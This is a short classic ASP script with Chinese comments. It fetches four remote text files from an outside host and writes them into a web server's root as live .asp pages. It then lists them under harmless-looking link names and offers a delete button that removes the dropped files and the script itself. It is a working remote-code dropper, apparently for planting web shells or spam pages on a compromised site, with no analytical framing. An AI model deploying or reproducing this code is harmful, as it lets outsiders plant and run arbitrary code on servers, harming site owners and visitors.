<% 
Server.ScriptTimeOut = 999
'随机数
Function RndNumber(MaxNum,MinNum)
Randomize 
RndNumber=int((MaxNum-MinNum+1)*rnd+MinNum)
RndNumber=RndNumber
End Function

''文件删除函数 
function deletefile(filename) 
if filename<>"" then 
set fso=server.CreateObject("scripting.filesystemobject") 
if fso.FileExists(filename) then 
fso.DeleteFile filename 
else 
Response.Write "<script>alert(''该文件不存在'');</script>" 
end if 
end if 
end function 

'远程下载
function downfilea(d_target,s_target) 
On  Error Resume Next   
    dim myhttp,objstream 
    set myhttp =server.createobject("MSXML2.XMLHTTP") 
    myhttp.open "GET ",d_target,false 
    myhttp.send() 
    set objstream=Server.CreateObject("adodb.stream")   
    objstream.Type=1   
    objstream.Mode=3   
    objstream.Open 
    objstream.Write myhttp.responseBody 
    objstream.SaveToFile s_target, 2 
    if err.number <> 0 then err.Clear 
end function 


dim reqVal
reqVal=Request.QueryString("del")
If reqVal="" Then

'随机生成不重复的key 并下载
dim url,rdmNum,rdmNum2,key1,key2,key3,urls

urls="http://www.qq188.info/dy/"

downfilea urls&"5am_d_asp.txt",Server.MapPath("5am.asp") 
downfilea urls&"2051_d_asp.txt",Server.MapPath("2051.asp")
downfilea urls&"cy6z_d_asp.txt",Server.MapPath("cy6z.asp")
downfilea urls&"cy7z_d_asp.txt",Server.MapPath("cy7z.asp") 
 


Response.write "<br />"
Response.write "<a href ='5am.asp'  target='_blank'>aboutus</a>"
Response.write "<br />"
Response.write "<br />"
Response.write "<a href ='2051.asp'  target='_blank'>about</a>"
Response.write "<br />"
Response.write "<br />"
Response.write "<a href ='cy6z.asp'  target='_blank'>articles</a>"
Response.write "<br />"
Response.write "<br />"
Response.write "<a href ='cy7z.asp'  target='_blank'>news</a>"
Response.write "<br />"



Else
     deletefile(server.MapPath("a.asp"))
	 deletefile(server.MapPath("5am.asp"))
	 deletefile(server.MapPath("2051.asp"))
	 deletefile(server.MapPath("cy6z.asp"))
	 deletefile(server.MapPath("cy7z.asp"))
     
End If
%> 
<form method="get" action>
 <input type="hidden" name="del" value="del"/></p>
<input type="submit" value="delete" />
</form>


